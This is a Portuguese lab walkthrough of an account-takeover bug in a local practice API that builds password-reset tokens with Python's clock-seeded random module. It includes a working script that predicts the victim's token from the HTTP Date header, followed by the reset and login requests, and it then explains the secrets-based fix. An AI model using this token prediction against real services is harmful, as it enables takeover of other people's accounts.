# Walkthrough — weak-password-reset

A app é uma API de conta pequena com um fluxo de forgot-password: `POST /forgot` emite um **reset token** e o "envia por e-mail" ao dono da conta, e `POST /reset` deixa quem apresentar esse token definir uma nova senha. O fluxo está correto — quem tem um token válido pode resetar a senha, que é exatamente como o forgot-password deve funcionar. O problema é *como* o token é gerado: com o módulo `random` do Python, **seedado com o relógio**. `random` é determinístico a partir do seed, e o seed — o horário do servidor em segundos inteiros — te é entregue de graça no header HTTP `Date` da resposta. Re-seede com ele, rode o mesmo gerador, e você reproduz o token que o servidor gerou para a vítima.

A trilha é **Burp Suite (Repeater)** para cada request, mais um pequeno **script local** que reproduz o token — reproduzir a saída de um PRNG é algo que o Burp não faz, então, do mesmo jeito que um browser roda JavaScript para um bug client-side, a ferramenta que faz essa parte do trabalho entra na trilha principal. Não há browser. A prova é um `POST /login` como a vítima, com uma senha que o *atacante* escolheu.

## 1. Contexto

Uma API de conta pequena em `127.0.0.1:8037` (vulnerável) e `127.0.0.1:8137` (corrigida):

- `GET /` — um banner JSON. Não é o alvo.
- `POST /login` — JSON `{"email", "password"}`. Verifica contra o hash de senha guardado; retorna `200 {"authenticated": true}` ou `401`. É a **prova** do takeover.
- `POST /forgot` — JSON `{"email"}`. Se a conta existe, gera um reset token, guarda `token → email`, e "envia por e-mail" o token ao dono. Responde **genericamente** (`"If that account exists, a reset link has been sent."`) — nunca devolve o token e nunca revela se a conta existe.
- `POST /reset` — JSON `{"token", "new_password"}`. Se o token é válido, define a nova senha para **o dono do token**.

Este átomo é **A07 — Identification and Authentication Failures**: o mecanismo que recupera uma credencial gera essa credencial de um jeito adivinhável.

Termos, definidos uma vez:

- **Password-reset flow (o fluxo de "esqueci minha senha").** Um usuário que não consegue provar a senha antiga (esqueceu) recupera a conta *pedindo* um reset com o e-mail dele, *recebendo* um token out-of-band (por e-mail), e *apresentando* esse token para definir uma nova senha. Três passos: pedir → receber o token → definir a nova senha.
- **Reset token = uma credencial temporária.** O token — não a senha antiga, não uma sessão — é o que prova que você é o dono da conta *para este reset*. Quem tem um token válido pode trocar a senha, então o token **é** a autorização. É uma **credencial** (uma prova de identidade) que é **temporária** (de vida curta, feita para ser usada uma vez). Se um atacante descobre o token, então para o servidor ele simplesmente *é* o dono da conta.
- **Entropia / imprevisibilidade.** Entropia mede quão imprevisível um valor é — quantos chutes, em média, seriam precisos para acertá-lo. Um segredo só é seguro com entropia alta: tantas possibilidades que adivinhar é inviável. Um reset token *precisa* ser impossível de adivinhar, porque adivinhá-lo **é** tomar a conta. Entropia baixa ou previsível mata o segredo, por mais longo que ele pareça.
- **PRNG vs CSPRNG.** Um **PRNG** (pseudo-random number generator) calcula números "aleatórios" a partir de um valor inicial, por uma fórmula. Ele *parece* aleatório mas é **determinístico**: mesmo seed, mesma sequência, sempre — ótimo para simulações, errado para segredos. Um **CSPRNG** (cryptographically secure PRNG) é feito para segurança: sua saída é imprevisível mesmo para quem viu saídas anteriores, e ele se semeia com entropia do sistema operacional (`os.urandom`). No Python, **`random` é um PRNG** e **`secrets` é o CSPRNG** — essa diferença é o átomo inteiro.
- **Seed.** O valor inicial que determina a sequência *inteira* de um PRNG. Chame `random.seed(X)` e as próximas chamadas `random.*` produzem sempre a mesma sequência para o mesmo `X`. A consequência afiada: **se o seed é previsível, a sequência inteira é.** Seedar com `int(time.time())` — o relógio em segundos — seeda com um valor que qualquer um calcula, inclusive pelo header `Date`.
- **Mersenne Twister.** O algoritmo por trás do `random` do Python. Estatisticamente excelente (ideal para simulações) e **explicitamente não criptográfico** — a doc do Python diz claramente: não use `random` para segurança, use `secrets`. Dado o seed (ou saídas suficientes), seu estado interno é recuperável e sua sequência reproduzível. Determinístico por design — o oposto do que um segredo precisa.
- **Single-use / expiração.** Um reset token bem-feito morre **depois de usado** (single-use: uma vez que trocou a senha, não vale mais) e **depois de um tempo curto** (expiração: vale por poucos minutos). Isso limita por quanto tempo um token vazado é útil. São *higiene* de token — parte de um fix completo — mas não a falha central deste átomo, que é a previsibilidade.

## 2. Achar o bug

Abra [`vulnerable/app.py`](./vulnerable/app.py) e leia o gerador do token:

```python
ALPHABET = string.ascii_letters + string.digits
TOKEN_LEN = 32

def make_reset_token():
    random.seed(int(time.time()))
    return "".join(random.choice(ALPHABET) for _ in range(TOKEN_LEN))
```

O fluxo de reset ao redor está correto: o token é guardado contra o seu dono, e `POST /reset` troca a senha *do dono do token* — não há um user id no corpo do request para adulterar. A pergunta de auditoria não é "o fluxo checa o token?" — ele checa. É **"de onde vem a aleatoriedade deste segredo?"** Aqui vem de um **PRNG seedado com o relógio** — e o relógio está no header `Date`. Tudo que o ataque precisa está nessas duas linhas: o gerador é o `random` (reproduzível a partir do seed), e o seed é `int(time.time())` (legível em qualquer resposta). O fix (seção 7) é um gerador diferente.

## 3. Baseline — o fluxo funcionando

Primeiro, o fluxo legítimo, para você saber como é o "normal". Um usuário real reseta a *própria* senha. Aponte o Burp para `127.0.0.1:8037` e peça um reset para `attacker@lab` (uma conta que você controla):

```
POST /forgot HTTP/1.1
Host: 127.0.0.1:8037
Content-Type: application/json

{"email": "attacker@lab"}
```

```
HTTP/1.1 200 OK
{"message":"If that account exists, a reset link has been sent."}
```

O token foi "enviado por e-mail". Neste lab, "por e-mail" significa impresso no log do servidor — essa é a sua **inbox**. Leia-a (`docker compose logs vulnerable`):

```
vulnerable-1  | [reset-email] to=attacker@lab token=NEHcwezLDbE416JOrlzlw5R7ThtUyZt4
```

Agora apresente esse token ao `POST /reset`, e depois logue com a nova senha:

```
POST /reset HTTP/1.1
Host: 127.0.0.1:8037
Content-Type: application/json

{"token": "NEHcwezLDbE416JOrlzlw5R7ThtUyZt4", "new_password": "legit-new-pw"}
```

```
HTTP/1.1 200 OK
{"reset":true}
```

`POST /login` com `{"email":"attacker@lab","password":"legit-new-pw"}` → `200 {"authenticated":true}`. O fluxo funciona. Note que para a *sua própria* conta você lê o token da *sua própria* inbox. O ataque abaixo nunca toca a inbox da vítima — ele calcula o token dela.

## 4. Exploração via Burp Suite (trilha principal)

Agora o ataque. O alvo é `victim@lab`, uma conta que você **não** controla e cuja inbox você não pode ler.

### Passo 1 — COMO ATACANTE: pedir o reset da vítima e ler o relógio

```
POST /forgot HTTP/1.1
Host: 127.0.0.1:8037
Content-Type: application/json

{"email": "victim@lab"}
```

```
HTTP/1.1 200 OK
Date: Thu, 10 Sep 2026 13:50:01 GMT
Content-Type: application/json

{"message":"If that account exists, a reset link has been sent."}
```

O corpo não te diz nada — é genérico de propósito, e o token foi para a inbox da vítima, não para você. Mas olhe o **header `Date`**: `Thu, 10 Sep 2026 13:50:01 GMT`. Esse é o relógio do servidor, ao segundo — e o servidor seedou o gerador do token com `int(time.time())` naquele mesmo segundo. O seed é `13:50:01 GMT`.

### Passo 2 — COMO ATACANTE: reproduzir o token localmente

O token não é aleatório para quem conhece o gerador e o seed. Este script curto roda o **mesmo** `random.seed()` + `random.choice()` que o servidor rodou, re-seedado a partir do header `Date`. Ele varre uma pequena janela de segundos para absorver qualquer clock skew entre a geração do token e a datação da resposta (errar por um segundo muda o token inteiro, então a janela não é opcional):

```python
#!/usr/bin/env python3
# Reproduce the server's predictable reset token. It runs the SAME generator the app runs,
# re-seeded from the clock the app used -- which the /forgot response handed us in the Date header.
import sys, random, string, calendar, email.utils

ALPHABET = string.ascii_letters + string.digits   # must match the server's generator
TOKEN_LEN = 32

def predict(seed):
    random.seed(seed)                              # same seed -> same Mersenne Twister sequence
    return "".join(random.choice(ALPHABET) for _ in range(TOKEN_LEN))

date_header = sys.argv[1]                           # the Date: header from the /forgot response
t = calendar.timegm(email.utils.parsedate(date_header))   # HTTP date (GMT) -> epoch seconds
for seed in range(t - 3, t + 4):                   # sweep +/-3s to absorb clock skew
    print(seed, predict(seed))
```

Rode-o com o valor do `Date`:

```
$ python3 predict.py "Thu, 10 Sep 2026 13:50:01 GMT"
1789048198 V0b1XNfDHul8RKdjoAB7jgdVIfi8kMkR
1789048199 jB6ANsb690srPhCIXIndNUtEIrvCEqVY
1789048200 SdrUM0m9eeFRwH9lqJyzevl4BgF0B8rQ
1789048201 N8c1UBJwiHypnOeNts2fStuCLbAGJH8F
1789048202 VVhUja8QhZmVyatC7w76Ao9RrOSGxg5b
1789048203 MVVld0VfTnE9B7NAHEH80aAgxI4hh9hd
1789048204 SkPNYuVzHrEtOOTUX4xLrlMKKmucStq7
```

Sete candidatos, um por segundo na janela. O token para o segundo exato em que a resposta foi datada (epoch `1789048201`) é `N8c1UBJwiHypnOeNts2fStuCLbAGJH8F`. (Você não leu isso de lugar nenhum — você o *calculou*. Neste lab você pode confirmar que ele é byte a byte o token que o servidor "enviou por e-mail" para a vítima, mas o atacante nunca precisa da inbox.)

### Passo 3 — COMO ATACANTE: resetar a senha da vítima

Alimente cada candidato ao `POST /reset` (no Repeater, ou com o Intruder sobre os sete) até um ser aceito. O token de `1789048201` é:

```
POST /reset HTTP/1.1
Host: 127.0.0.1:8037
Content-Type: application/json

{"token": "N8c1UBJwiHypnOeNts2fStuCLbAGJH8F", "new_password": "pwned-by-attacker"}
```

```
HTTP/1.1 200 OK
{"reset":true}
```

Aceito. A senha da vítima agora é `pwned-by-attacker` — um valor que **você** escolheu.

### Passo 4 — COMO ATACANTE: logar como a vítima (a prova)

```
POST /login HTTP/1.1
Host: 127.0.0.1:8037
Content-Type: application/json

{"email": "victim@lab", "password": "pwned-by-attacker"}
```

```
HTTP/1.1 200 OK
{"authenticated":true}
```

**Account takeover.** Você está logado como a vítima com uma senha que você definiu. Você nunca viu a senha antiga dela, nunca leu a inbox dela, nunca chutou às cegas — você *previu* o reset token, porque o gerador que o fez é previsível.

> Este é um lab local: os dois apps bindam em `127.0.0.1`, os usuários e senhas são dummy (`victim@lab`, `attacker@lab`, senhas de lab obviamente falsas), e o "exploit" é um script que roda o mesmo `random` que o servidor roda — nada aqui sai da box e nada é destrutivo. Num alvo real isso é account takeover de qualquer conta cujo reset você consiga pedir.

## 5. O que a vuln NÃO é

Cinco conclusões erradas para matar. Cada uma mantém este átomo distinto de um vizinho.

**NÃO é IDOR.** O token previsto não é o id de um objeto que você acessa sob um check de controle de acesso ausente. É o **segredo de autenticação** em si. O `POST /reset` age no *dono do token*, e não há um user id no request para trocar — prever o token *é* virar a vítima, não alcançar o recurso dela por baixo de um guard quebrado. (Contraste com o [`idor-numeric-id`](../../A01-broken-access-control/idor-numeric-id/), onde você troca o id de um objeto e o servidor te entrega o registro de outra pessoa porque nunca checou o dono.)

**NÃO é um átomo de crypto.** Nada é quebrado. Nenhum hash é revertido, nenhuma cifra é quebrada, nenhuma chave é forçada. O token é *reproduzido* porque seu gerador é determinístico e seu seed é observável. Isso é uma falha em *como o fluxo de autenticação foi desenhado*, não numa primitiva criptográfica — por isso é A07, não A02. (Contraste com o [`crypto-weak-hash`](../../A02-cryptographic-failures/crypto-weak-hash/), onde você quebra um hash de senha armazenado offline.)

**NÃO é "faltou autenticação".** O fluxo autentica corretamente — por posse do token, exatamente como o forgot-password deve. O atacante não burla um check; ele o *satisfaz*, com o token certo, que calculou. O furo é que o token certo é calculável.

**NÃO é "o token é curto demais".** Fazer um gerador *previsível* produzir um token mais longo não ajuda: uma vez que você reproduz o seed, você gera o token inteiro, seja qual for o tamanho. A fraqueza é a **previsibilidade**, não o tamanho. Um token de 128 caracteres seedado com o relógio cai para o mesmo script.

**NÃO é "só faltou uma expiração (ou single-use)".** O furo central é a previsibilidade. Adicionar uma expiração a um token *previsível* só dá ao atacante uma janela — e ele prevê e usa o token dentro dela, na hora, como acima. Single-use e expiração são higiene que o lado corrigido também adiciona, mas não são o que derrota este ataque (seção 7).

E, ancorando no irmão: diferente do [`session-fixation`](../session-fixation/) — onde o session id é *forte* (`secrets.token_urlsafe`) e o bug é que ele sobrevive ao login —, aqui o segredo é *fraco/previsível*, e isso **é** o bug. As próprias notas do session fixation dizem que um id previsível "seria um bug diferente"; este é esse bug diferente.

O que **é**, cirurgicamente: o reset token — uma credencial temporária — é gerado por um PRNG seedado com um valor observável (o relógio, via `Date`), então é reproduzível; o atacante regenera o token da vítima e reseta a senha dela. Troque o gerador e o ataque morre — que é exatamente o que o fix faz.

## 6. Impacto

Account takeover. A partir de nada além do endereço de e-mail da vítima e de um header de resposta, o atacante define a senha da vítima e loga como ela — lendo a conta dela, agindo como ela. **Não** é RCE, e o atacante nunca fica sabendo a senha antiga; o poder vem inteiramente de o reset token ser calculável. Num alvo real a mesma previsibilidade vale para *qualquer* conta cujo reset o atacante consiga pedir, o que geralmente significa toda conta.

## 7. Por que o fix funciona (porta 8137)

Rode o mesmo ataque contra a API corrigida em `127.0.0.1:8137`.

Peça o reset da vítima e leia o header `Date`, exatamente como antes:

```
POST /forgot HTTP/1.1
Host: 127.0.0.1:8137
Content-Type: application/json

{"email": "victim@lab"}
```

```
HTTP/1.1 200 OK
Date: Thu, 10 Sep 2026 13:50:02 GMT

{"message":"If that account exists, a reset link has been sent."}
```

Rode o **mesmo** preditor no novo `Date` e alimente cada candidato da janela ao `POST /reset`:

```
{"token": "<cada token previsto, seeds t-3 .. t+3>", "new_password": "pwned-by-attacker"}
```

```
HTTP/1.1 400 BAD REQUEST
{"reset":false}
```

Todos — os sete segundos da janela — são rejeitados. `POST /login {"email":"victim@lab","password":"pwned-by-attacker"}` retorna `401`: **sem takeover.** O gerador corrigido é:

```python
def make_reset_token():
    return secrets.token_urlsafe(32)
```

`secrets.token_urlsafe(32)` puxa de um **CSPRNG** (`os.urandom`) — ~256 bits de entropia imprevisível, sem seed que o atacante possa reproduzir. O header `Date` ainda revela o segundo, mas não há seed para alimentá-lo: o token veio da entropia do sistema operacional, não de um PRNG seedado com o relógio. O token que o servidor corrigido "enviou por e-mail" nesta rodada foi `p0AFCrZy7n3U3xvffI7DKAkqCPUeGRTUhZKrkubBiE8` — um valor que nada na resposta estreita. É o **mesmo gerador que o `session-fixation` usa para os session ids.**

Note *onde* o token previsto falha no lado corrigido: no `POST /reset`, como um **token desconhecido** — ele nunca esteve no store, porque o `secrets` gerou outra coisa completamente. O lado corrigido também torna os tokens single-use e de vida curta (defense in depth para um token que *já* é imprevisível), mas isso nem chega a entrar em jogo contra um token previsto: um token desconhecido é rejeitado antes de expiração ou single-use serem consultados. A mudança decisiva é o **gerador imprevisível**, ponto.

A prova de isolamento: o reset legítimo self-service da seção 3 funciona **idêntico** nas duas portas — pedir, ler a própria inbox, resetar, logar, `200` de cada lado. Só *prever o token da vítima* separa os dois, e essa diferença traça puramente ao gerador. Veja [`DIFF.md`](./DIFF.md) para o diff e por que "um token mais longo" e "um seed melhor" são, os dois, o fix errado.
